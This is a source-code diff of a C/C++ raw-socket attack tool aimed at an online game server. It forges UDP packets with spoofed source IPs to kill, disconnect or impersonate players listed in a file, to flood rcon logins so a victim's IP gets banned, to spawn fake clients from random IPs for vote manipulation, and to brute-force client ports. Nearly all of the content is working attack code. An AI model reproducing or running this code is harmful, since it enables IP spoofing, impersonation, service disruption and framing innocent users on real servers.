@@ -24,7 +24,7 @@
 #include "api.h"
 
 
-void SendData(const char *pData, int Size, int s)
+void SendData(const char *pData, int Size)
 {
 	m_PayloadSize = Size;
 
@@ -45,7 +45,7 @@ void SendData(const char *pData, int Size, int s)
 	IP.TTL = 128;
 	IP.Protocol = IPPROTO_UDP;
 	IP.Checksum = 0;
-	IP.SourceIP = m_FromIP[s];
+	IP.SourceIP = m_FromIP;
 	IP.DestIP = m_ToIP;
 	IP.Checksum = checksum((USHORT *)&IP, sizeof(IP));
 
@@ -105,14 +105,97 @@ void SendData(const char *pData, int Size, int s)
 	m_Sin.sin_port = m_ToPort;
 	m_Sin.sin_addr.s_addr = m_ToIP;
 
-	int Bytes = sendto(m_Sock[s], m_aPacket, sizeof(IP) + sizeof(UDP) + m_PayloadSize, 0, (SOCKADDR *)&m_Sin, sizeof(m_Sin));
-
-
+	sendto(m_Sock, m_aPacket, sizeof(IP) + sizeof(UDP) + m_PayloadSize, 0, (SOCKADDR *)&m_Sin, sizeof(m_Sin));
 
 	/*if(Bytes != SOCKET_ERROR)
 	std::cout << Bytes << " sent" << std::endl; */
+}
 
+void SendData(const char *pData, int Size, int s)
+{
+	m_PayloadSize = Size;
 
+	ZeroMemory(m_aMessage, MAX_MESSAGE);
+
+	for (unsigned int i = 0; i < m_PayloadSize; i++)
+		m_aMessage[i] = pData[i];
+
+	IP_HDR IP;
+	IP.Version = 4;
+	IP.IHL = sizeof(IP_HDR) / sizeof(unsigned long);
+	IP.DSCP = 0;
+	IP.ECN = 1;
+	IP.Length = htons(sizeof(IP_HDR) + sizeof(UDP_HDR) + m_PayloadSize);
+	IP.ID = 0;
+	IP.Flags = 0;
+	IP.FragOffset = 0;
+	IP.TTL = 128;
+	IP.Protocol = IPPROTO_UDP;
+	IP.Checksum = 0;
+	IP.SourceIP = m_FromIPDummies[s];
+	IP.DestIP = m_ToIP;
+	IP.Checksum = checksum((USHORT *)&IP, sizeof(IP));
+
+	UDP_HDR UDP;
+	UDP.SourcePort = 1337;
+	UDP.DestPort = m_ToPort;
+	UDP.Length = htons(sizeof(UDP_HDR) + m_PayloadSize);
+	UDP.Checksum = 0;
+
+	char *ptr = NULL;
+
+	m_ChecksumUDP = 0;
+	ptr = m_aPacket;
+	ZeroMemory(m_aPacket, MAX_PACKET);
+
+	memcpy(ptr, &IP.SourceIP, sizeof(IP.SourceIP));
+	ptr += sizeof(IP.SourceIP);
+	m_ChecksumUDP += sizeof(IP.SourceIP);
+
+	memcpy(ptr, &IP.DestIP, sizeof(IP.DestIP));
+	ptr += sizeof(IP.DestIP);
+	m_ChecksumUDP += sizeof(IP.DestIP);
+
+	ptr++;
+	m_ChecksumUDP++;
+
+	memcpy(ptr, &IP.Protocol, sizeof(IP.Protocol));
+	ptr += sizeof(IP.Protocol);
+	m_ChecksumUDP += sizeof(IP.Protocol);
+
+	memcpy(ptr, &UDP.Length, sizeof(UDP.Length));
+	ptr += sizeof(UDP.Length);
+	m_ChecksumUDP += sizeof(UDP.Length);
+
+	memcpy(ptr, &UDP, sizeof(UDP));
+	ptr += sizeof(UDP);
+	m_ChecksumUDP += sizeof(UDP);
+
+	for (unsigned int i = 0; i < m_PayloadSize; i++, ptr++)
+		*ptr = m_aMessage[i];
+	m_ChecksumUDP += m_PayloadSize;
+
+	UDP.Checksum = checksum((USHORT *)m_aPacket, m_ChecksumUDP);
+
+	ZeroMemory(m_aPacket, MAX_PACKET);
+	ptr = m_aPacket;
+
+	memcpy(ptr, &IP, sizeof(IP));
+	ptr += sizeof(IP);
+
+	memcpy(ptr, &UDP, sizeof(UDP));
+	ptr += sizeof(UDP);
+
+	memcpy(ptr, m_aMessage, m_PayloadSize);
+
+	m_Sin.sin_family = AF_INET;
+	m_Sin.sin_port = m_ToPort;
+	m_Sin.sin_addr.s_addr = m_ToIP;
+
+	sendto(m_SockDummies[s], m_aPacket, sizeof(IP) + sizeof(UDP) + m_PayloadSize, 0, (SOCKADDR *)&m_Sin, sizeof(m_Sin));
+
+	/*if(Bytes != SOCKET_ERROR)
+	std::cout << Bytes << " sent" << std::endl; */
 }
 
 bool Create(SOCKET *pSock)
@@ -159,9 +242,15 @@ void Output(char *pBuf)
 	printf("%s", pBuf);
 }
 
-void Close(int s)
+void Close()
 {
-	closesocket(m_Sock[s]);
+	closesocket(m_Sock);
+	WSACleanup();
+}
+
+void Close(int id)
+{
+	closesocket(m_SockDummies[id]);
 	WSACleanup();
 	//getchar();
 }
@@ -265,20 +354,17 @@ void ConnectDummies(const char *IP, int Port, int Amount, int Vote)
 	int i;
 	for(i = 0; i < Amount; i++)
 	{
-		if (!Create(&m_Sock[i]))
+		if (!Create(&m_SockDummies[i]))
 			Close(i);
 	}
 
 	// generate IPs
 	for (int k = 0; k < Amount; k++)
 	{
-		m_FromIP[k] = inet_addr(GenIPChar());
+		m_FromIPDummies[k] = inet_addr(GenIPChar());
 	}
 
-	//for tests!
-	//m_FromIP[0] = inet_addr("111.111.111.111");
-
-	m_FromPort = htons(1111);
+	//source port in dummies is const = 1337 ;)
 
 	m_ToIP = inet_addr(IP);
 	m_ToPort = htons(Port);
@@ -379,10 +465,10 @@ void VoteBot(const char *IP, int Port, int Amount, int v)
 */
 void RconBan(const char *SrvIP, int Port, const char *BanIP)
 {
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
-	m_FromIP[0] = inet_addr(BanIP);
+	m_FromIP = inet_addr(BanIP);
 
 	m_FromPort = htons(1111);
 
@@ -391,28 +477,28 @@ void RconBan(const char *SrvIP, int Port, const char *BanIP)
 
 	unsigned char buffer[2048];
 	int BufferSize = 0;
-	Reset(0);
+	Reset();
 
 	// send the dummy used to spam the rcon
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackConnect(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	SendData((const char*)buffer, BufferSize);
 
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackClientInfo(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	SendData((const char*)buffer, BufferSize);
 
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackReady(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	SendData((const char*)buffer, BufferSize);
 
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackSendInfo(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	SendData((const char*)buffer, BufferSize);
 
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackEnterGame(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	SendData((const char*)buffer, BufferSize);
 
 	// -> Tick() function
 	m_SendRcon = true;
@@ -420,10 +506,10 @@ void RconBan(const char *SrvIP, int Port, const char *BanIP)
 
 void SendConnect(const char *SrvIP, int Port, const char *SpoofIP)
 {
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
-	m_FromIP[0] = inet_addr(SpoofIP);
+	m_FromIP = inet_addr(SpoofIP);
 	m_FromPort = htons(1337);
 
 	m_ToIP = inet_addr(SrvIP);
@@ -431,35 +517,35 @@ void SendConnect(const char *SrvIP, int Port, const char *SpoofIP)
 
 	unsigned char buffer[2048];
 	int BufferSize = 0;
-	Reset(0);
+	Reset();
 
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackConnect(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	SendData((const char*)buffer, BufferSize);
 
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackClientInfo(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	SendData((const char*)buffer, BufferSize);
 
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackReady(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	SendData((const char*)buffer, BufferSize);
 
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackSendInfo(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	SendData((const char*)buffer, BufferSize);
 
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackEnterGame(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	SendData((const char*)buffer, BufferSize);
 }
 
 void SendDisconnect(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort)
 {
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
-	m_FromIP[0] = inet_addr(SpoofIP);
+	m_FromIP = inet_addr(SpoofIP);
 	m_FromPort = htons(SpoofPort);
 
 	m_ToIP = inet_addr(SrvIP);
@@ -467,11 +553,11 @@ void SendDisconnect(const char *SrvIP, int Port, const char *SpoofIP, int SpoofP
 
 	unsigned char buffer[2048];
 	int BufferSize = 0;
-	Reset(0);
+	Reset();
 
 	ZeroMemory(buffer, sizeof(buffer));
 	BufferSize = PackDisconnect(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	SendData((const char*)buffer, BufferSize);
 }
 
 void SendStressingNetwork(const char *SrvIP, int Port, const char *SpoofIP)
@@ -487,10 +573,10 @@ void SendStressingNetwork(const char *SrvIP, int Port, const char *SpoofIP)
 
 void SendKill(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort)
 {
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
-	m_FromIP[0] = inet_addr(SpoofIP);
+	m_FromIP = inet_addr(SpoofIP);
 	m_FromPort = htons(SpoofPort);
 
 	m_ToIP = inet_addr(SrvIP);
@@ -498,19 +584,19 @@ void SendKill(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort)
 
 	unsigned char buffer[2048];
 	int BufferSize = 0;
-	Reset(0);
+	Reset();
 
 	ZeroMemory(buffer, sizeof(buffer));
-	BufferSize = PackKill(&buffer[0], 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	BufferSize = PackKill(&buffer[0]);
+	SendData((const char*)buffer, BufferSize);
 }
 
 void SendRcon(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, const char *pCmd)
 {
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
-	m_FromIP[0] = inet_addr(SpoofIP);
+	m_FromIP = inet_addr(SpoofIP);
 	m_FromPort = htons(SpoofPort);
 
 	m_ToIP = inet_addr(SrvIP);
@@ -518,11 +604,11 @@ void SendRcon(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, c
 
 	unsigned char buffer[2048];
 	int BufferSize = 0;
-	Reset(0);
+	Reset();
 
 	ZeroMemory(buffer, sizeof(buffer));
-	BufferSize = PackRcon(&buffer[0], 0, pCmd);
-	SendData((const char*)buffer, BufferSize, 0);
+	BufferSize = PackRcon(&buffer[0], pCmd);
+	SendData((const char*)buffer, BufferSize);
 
 	char aBuf[256];
 	str_format(aBuf, sizeof(aBuf), "Send '%s' through %s:%d to %s:%d", pCmd, SpoofIP, SpoofPort, SrvIP, Port);
@@ -533,10 +619,10 @@ void SendChat(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, c
 {
 	// ToDo: More than one word as Msg ._. --Note by Meskalin: This should not be done here, but where the command is received.
 
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
-	m_FromIP[0] = inet_addr(SpoofIP);
+	m_FromIP = inet_addr(SpoofIP);
 	m_FromPort = htons(SpoofPort);
 
 	m_ToIP = inet_addr(SrvIP);
@@ -544,7 +630,7 @@ void SendChat(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, c
 
 	unsigned char buffer[2048];
 	int BufferSize = 0;
-	Reset(0);
+	Reset();
 
 	char aMsg[256];
 	sprintf_s(aMsg, sizeof(aMsg), "%s", Msg);
@@ -552,16 +638,16 @@ void SendChat(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, c
 	//printf("Sending '%s' through %s:%d to %s:%d\n", aMsg, SpoofIP, SpoofPort, SrvIP, Port);
 
 	ZeroMemory(buffer, sizeof(buffer));
-	BufferSize = PackSay(&buffer[0], 0, aMsg, 0);
-	SendData((const char*)buffer, BufferSize, 0);
+	BufferSize = PackSay(&buffer[0], aMsg, 0);
+	SendData((const char*)buffer, BufferSize);
 }
 
 void SendChangeInfo(const char *SrvIP, int Port, const char *SpoofIP, int SpoofPort, char *name, char *clan, int country, char *skin, int usecustomcolor, int colorbody, int colorfeet)
 {
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
-	m_FromIP[0] = inet_addr(SpoofIP);
+	m_FromIP = inet_addr(SpoofIP);
 	m_FromPort = htons(SpoofPort);
 
 	m_ToIP = inet_addr(SrvIP);
@@ -569,11 +655,11 @@ void SendChangeInfo(const char *SrvIP, int Port, const char *SpoofIP, int SpoofP
 
 	unsigned char buffer[2048];
 	int BufferSize = 0;
-	Reset(0);
+	Reset();
 
 	ZeroMemory(buffer, sizeof(buffer));
-	BufferSize = PackChangeInfo(&buffer[0], 0, name, clan, country, skin, usecustomcolor, colorbody, colorfeet);
-	SendData((const char*)buffer, BufferSize, 0);
+	BufferSize = PackChangeInfo(&buffer[0], name, clan, country, skin, usecustomcolor, colorbody, colorfeet);
+	SendData((const char*)buffer, BufferSize);
 }
 
 void SpamIPs(const char *IP, int Port)
@@ -585,8 +671,8 @@ void SpamIPs(const char *IP, int Port)
 		return;
 	}
 
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
 	// loop through the file
 	std::string Line;
@@ -611,23 +697,25 @@ void SpamIPs(const char *IP, int Port)
 			Char++;
 		}
 
-		m_FromIP[0] = inet_addr(aSplit[0]);
+		m_FromIP = inet_addr(aSplit[0]);
 		m_FromPort = htons(atoi(aSplit[1]));
+
+		printf(aSplit[0]);
 
 		m_ToIP = inet_addr(IP);
 		m_ToPort = htons(Port);
 
 		unsigned char buffer[2048];
 		int BufferSize = 0;
-		Reset(0);
+		Reset();
 
 		char aMsg[256];
 		str_format(aMsg, sizeof(aMsg), "%s", Line.c_str());
 
 		// send the chat packet
 		ZeroMemory(buffer, sizeof(buffer));
-		BufferSize = PackSay(&buffer[0], 0, aMsg, 0);
-		SendData((const char*)buffer, BufferSize, 0);
+		BufferSize = PackSay(&buffer[0], aMsg, 0);
+		SendData((const char*)buffer, BufferSize);
 	}
 }
 
@@ -640,8 +728,8 @@ void KillAll(const char *IP, int Port)
 		return;
 	}
 
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
 	// loop through the file
 	std::string Line;
@@ -666,7 +754,7 @@ void KillAll(const char *IP, int Port)
 			Char++;
 		}
 
-		m_FromIP[0] = inet_addr(aSplit[0]);
+		m_FromIP = inet_addr(aSplit[0]);
 		m_FromPort = htons(atoi(aSplit[1]));
 
 		m_ToIP = inet_addr(IP);
@@ -674,12 +762,12 @@ void KillAll(const char *IP, int Port)
 
 		unsigned char buffer[2048];
 		int BufferSize = 0;
-		Reset(0);
+		Reset();
 
 		// send the kill packet
 		ZeroMemory(buffer, sizeof(buffer));
-		BufferSize = PackKill(&buffer[0], 0);
-		SendData((const char*)buffer, BufferSize, 0);
+		BufferSize = PackKill(&buffer[0]);
+		SendData((const char*)buffer, BufferSize);
 	}
 }
 
@@ -692,8 +780,8 @@ void DCAll(const char *IP, int Port)
 		return;
 	}
 
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
 	// loop through the file
 	std::string Line;
@@ -718,7 +806,7 @@ void DCAll(const char *IP, int Port)
 			Char++;
 		}
 
-		m_FromIP[0] = inet_addr(aSplit[0]);
+		m_FromIP = inet_addr(aSplit[0]);
 		m_FromPort = htons(atoi(aSplit[1]));
 
 		m_ToIP = inet_addr(IP);
@@ -726,12 +814,12 @@ void DCAll(const char *IP, int Port)
 
 		unsigned char buffer[2048];
 		int BufferSize = 0;
-		Reset(0);
+		Reset();
 
 		// send the disconnect packet
 		ZeroMemory(buffer, sizeof(buffer));
-		BufferSize = PackDisconnect(&buffer[0], 0);
-		SendData((const char*)buffer, BufferSize, 0);
+		BufferSize = PackDisconnect(&buffer[0]);
+		SendData((const char*)buffer, BufferSize);
 	}
 }
 
@@ -744,8 +832,8 @@ void ChatAll(const char *IP, int Port, const char *Msg)
 		return;
 	}
 
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
 	// loop through the file
 	std::string Line;
@@ -770,7 +858,7 @@ void ChatAll(const char *IP, int Port, const char *Msg)
 			Char++;
 		}
 
-		m_FromIP[0] = inet_addr(aSplit[0]);
+		m_FromIP = inet_addr(aSplit[0]);
 		m_FromPort = htons(atoi(aSplit[1]));
 
 		m_ToIP = inet_addr(IP);
@@ -778,22 +866,22 @@ void ChatAll(const char *IP, int Port, const char *Msg)
 
 		unsigned char buffer[2048];
 		int BufferSize = 0;
-		Reset(0);
+		Reset();
 
 		char aMsg[256];
 		str_format(aMsg, sizeof(aMsg), "%s", Msg);
 
 		// send the chat packet
 		ZeroMemory(buffer, sizeof(buffer));
-		BufferSize = PackSay(&buffer[0], 0, aMsg, 0);
-		SendData((const char*)buffer, BufferSize, 0);
+		BufferSize = PackSay(&buffer[0], aMsg, 0);
+		SendData((const char*)buffer, BufferSize);
 	}
 }
 
 void BruteforcePort(const char *SrvIP, int Port, const char *SpoofIP)
 {
-	if (!Create(&m_Sock[0]))
-		Close(0);
+	if (!Create(&m_Sock))
+		Close();
 
 	m_ToIP = inet_addr(SrvIP);
 	m_ToPort = htons(Port);
@@ -801,19 +889,19 @@ void BruteforcePort(const char *SrvIP, int Port, const char *SpoofIP)
 	int i;
 	for(int i = 1024; i < 65535; i++)
 	{
-		m_FromIP[0] = inet_addr(SpoofIP);
+		m_FromIP = inet_addr(SpoofIP);
 		m_FromPort = htons(i);
 
 		unsigned char buffer[2048];
 		int BufferSize = 0;
-		Reset(0);
+		Reset();
 
 		char aMsg[256];
 		sprintf_s(aMsg, sizeof(aMsg), "%i", i);
 
 		ZeroMemory(buffer, sizeof(buffer));
 		BufferSize = PackSay(&buffer[0], 0, aMsg, 0);
-		SendData((const char*)buffer, BufferSize, 0);
+		SendData((const char*)buffer, BufferSize);
 
 		// little delay to reduce traffic
 		Sleep(1);
@@ -851,8 +939,8 @@ void Tick()
 			for(i = 0; i < 100; i++)
 			{
 				ZeroMemory(buffer, 2048);
-				BufferSize = PackRconAuth(&buffer[0], 0);
-				SendData((const char*)buffer, BufferSize, 0);
+				BufferSize = PackRconAuth(&buffer[0]);
+				SendData((const char*)buffer, BufferSize);
 				m_SendRcon = false;
 			}
 		}
